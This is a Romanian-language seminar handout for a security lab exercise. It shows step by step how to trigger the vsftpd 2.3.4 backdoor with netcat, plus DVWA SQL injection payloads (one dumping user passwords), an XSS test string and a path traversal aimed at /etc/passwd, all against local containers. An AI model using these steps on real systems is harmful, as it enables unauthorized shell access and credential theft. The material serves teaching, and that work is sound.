#### Seminar 13 – Stage 4

## Exploatare controlată: FTP Backdoor + SQL Injection

În acest stage vom pune în practică vulnerabilitățile identificate anterior.
Toate exploiturile sunt **controlate**, pe containere locale, astfel încât să înțelegeți:

* cum sunt declanșate vulnerabilitățile
* ce indicatori le confirmă
* cum poate arăta un exploit real (inclusiv scrierea unuia în Python)

---

# 1. Exploit 1 – vsftpd 2.3.4 „smiley backdoor” (CVE-2011-2523)

Una dintre cele mai cunoscute vulnerabilități FTP din lume.
Versiunea `2.3.4` a fost publicată cu un backdoor intenționat:

### Cum funcționează?

* Dacă un atacator trimite un username care conține **`: )`**, serverul:

  * răspunde normal (220 ready)
  * apoi deschide un **backdoor shell** pe portul **6200**

* Orice client care se conectează la 6200 primește un shell root (în versiunea originală), în containerul nostru — un shell limitat pentru siguranță.

### 1.1. Pasul 1: conectare normală la FTP

```bash
nc 172.20.0.12 2121
```

Trebuie să vedeți:

```
220 (vsFTPd 2.3.4)
```

### 1.2. Pasul 2: trimiteți username-ul special

```
USER test:)
PASS xyz
```

Serverul nu indică nimic, dar **backdoor-ul este acum activ**.

### 1.3. Pasul 3: conectați-vă la portul 6200

Într-un alt terminal:

```bash
nc 172.20.0.12 6200
```

Veți primi un prompt și puteți încerca:

```
id
whoami
```

În containerul nostru, veți primi un shell restricționat.

Acesta este exploitat în Stage 5 cu un script Python.

---

# 2. Exploit 2 – SQL Injection în DVWA (Security Level: LOW)

### Autentificare:

* USER: `admin`
* PASS: `password`

Navigați la:

```
SQL Injection
```

Introduceți:

```
1' OR '1'='1
```

Indicatorul că aplicația e vulnerabilă:

* lista tuturor utilizatorilor este returnată
* url-ul rămâne neschimbat
* nu există validare input

### Exemplu de payload pentru dump complet tabel:

```
1' UNION SELECT user, password FROM users #
```

---

# 3. Exploit 3 – XSS în DVWA (low security)

Introduceți în câmpul de input:

```
<script>alert('hacked')</script>
```

Dacă browserul afișează pop-up, XSS este activ.

---

# 4. Exploit 4 – Path traversal în WebGoat

WebGoat are un modul numit „Path Traversal”.
Încercați:

```
../../../../etc/passwd
```

---

# 5. Ce urmează?

În **Stage 5**, vom:

* scrie un script Python complet care:

  1. se conectează la FTP vulnerabil
  2. declanșează backdoor-ul
  3. se conectează la portul 6200
  4. execută comenzi automat
